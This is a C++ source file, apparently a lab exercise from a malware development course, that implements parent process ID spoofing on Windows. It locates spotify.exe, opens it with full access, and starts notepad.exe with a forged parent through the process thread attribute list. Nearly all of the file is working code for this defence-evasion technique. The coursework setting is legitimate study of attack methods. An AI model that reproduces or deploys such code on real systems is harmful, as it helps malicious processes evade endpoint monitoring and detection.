/*
* Lab 09 | Malware Dev Fall 2023
* PPID Spoofing
* coremed | willjcim
*/

#include <windows.h>
#include <Tlhelp32.h>
#include <stdio.h>
#include <iostream>
#include <SetupApi.h>

// Process that we are executing with spoofed PPID
#define TARGET_PROCESS "notepad.exe"

// Function to spawn PPID spoofed process
BOOL SpoofPPID(HANDLE hParentProc, LPCSTR lpProcName, DWORD* dwProcId, HANDLE* hProc, HANDLE* hThread) {
    // Declare and init some variables
    CHAR lpPath [MAX_PATH * 2];
    CHAR WorkingDir [MAX_PATH];
    CHAR WinDir [MAX_PATH];

    SIZE_T							sThreadAttList	= NULL;
    PPROC_THREAD_ATTRIBUTE_LIST		pThreadAttList	= NULL;

    STARTUPINFOEXA			SiEx	= { 0 };
    PROCESS_INFORMATION		Pi		= { 0 };

    // Zero out structs
    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION ));

    // Set size of struct
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Get %windir% env var (C:\Windows)
    if (!GetEnvironmentVariableA("WINDIR", WinDir, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Target process path
    sprintf(lpPath, "%s\\System32\\%s", WinDir,lpProcName);
    // lpCurrentDirectory in CreateProcessA (should be our working directory)
    sprintf(WorkingDir, "%s\\System32\\", WinDir);

    // Initialize attribute list, this will fail with ERROR_INSUFFICIENT_BUFFER / 122, but actually succeeded
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

    // Allocate memory
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL){
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Calling InitializeProcThreadAttributeList again passing the right parameters
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Update PPID, set PPID to spoofed PID
    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProc, sizeof(HANDLE), NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
    // created using `UpdateProcThreadAttribute` - that is the parent process
    SiEx.lpAttributeList = pThreadAttList;

    // Call CreateProcessA
    if (!CreateProcessA(
            NULL,
            lpPath,
            NULL,
            NULL,
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT,
            NULL,
            WorkingDir,
            &SiEx.StartupInfo,
            &Pi
            )) {
        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    // Populate output parameters
    *dwProcId = Pi.dwProcessId;
    *hProc = Pi.hProcess;
    *hThread = Pi.hThread;
    return TRUE;
}

// Function from lab-04
// function to get handle of remote process, returns BOOL
BOOL GetRemoteProcHandle(LPWSTR szProcName, DWORD *dwProcId, HANDLE *hProc) {
    // declare our Handle and ProcessEntry32
    HANDLE hSnapShot = NULL;
    PROCESSENTRY32 Proc;
    Proc.dwSize = sizeof(PROCESSENTRY32);

    // take a snapshot of all running processes
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // fetch info from first proc in the snapshot
    if (!Process32First(hSnapShot, &Proc)) {
        printf("Process32First Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // begin loop
    // iterate through all process in snapshot
    do {
        WCHAR lowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            DWORD dwSize = lstrlenW(reinterpret_cast<LPCWSTR>(Proc.szExeFile));
            DWORD i = 0;
            RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

            // converting each charachter in Proc.szExeFile to a lower case character and saving it
            // in lowerName to do the *wcscmp* call later

            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++) {
                    lowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
                }
                // C strings are NULL terminated
                lowerName[i++] = '\0';
            }
        }

        // compare process snapshot path with process path from argument
        if (wcscmp(lowerName, szProcName) == 0) {
            // save PID
            *dwProcId = Proc.th32ProcessID;
            // open process handle and return
            *hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProc == NULL) {
                printf("OpenProcess Failed With Error : %d \n", GetLastError());
            }
            break;
        }
        // get next process, iterate
    } while (Process32Next(hSnapShot, &Proc));

    // check if our Handle is NULL, return
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcId == NULL || *hProc == NULL)
        return FALSE;
    return TRUE;
}

int main() {
    wchar_t parentProc[] = L"spotify.exe";
    // Declare our vars
    HANDLE  hParentProc     = NULL;
    DWORD   dwParentProcId  = NULL;
    HANDLE  hProc           = NULL;
    DWORD   dwProcId        = NULL;
    HANDLE  hThread         = NULL;

    // Get handle and PID to spoof
    if(!GetRemoteProcHandle(parentProc, &dwParentProcId, &hParentProc)) {
        printf("GetRemoteProcHandle Failed With Error : %d \n", GetLastError());
    }
    if(hParentProc == NULL) {
        printf("hParentProc is NULL\n");
    }
    printf("[i] Spawning Target Process \"%s\" With Parent : %d \n", TARGET_PROCESS, dwParentProcId);
    // Create process and spoof the PPID
    if(!SpoofPPID(hParentProc, TARGET_PROCESS, &dwProcId, &hProc, &hThread)) {
        printf("SpoofPPID Failed With Error : %d \n", GetLastError());
    }

    // Pause
    system("pause");

    // Clean up
    CloseHandle(hProc);
    CloseHandle(hThread);
    return  0;
}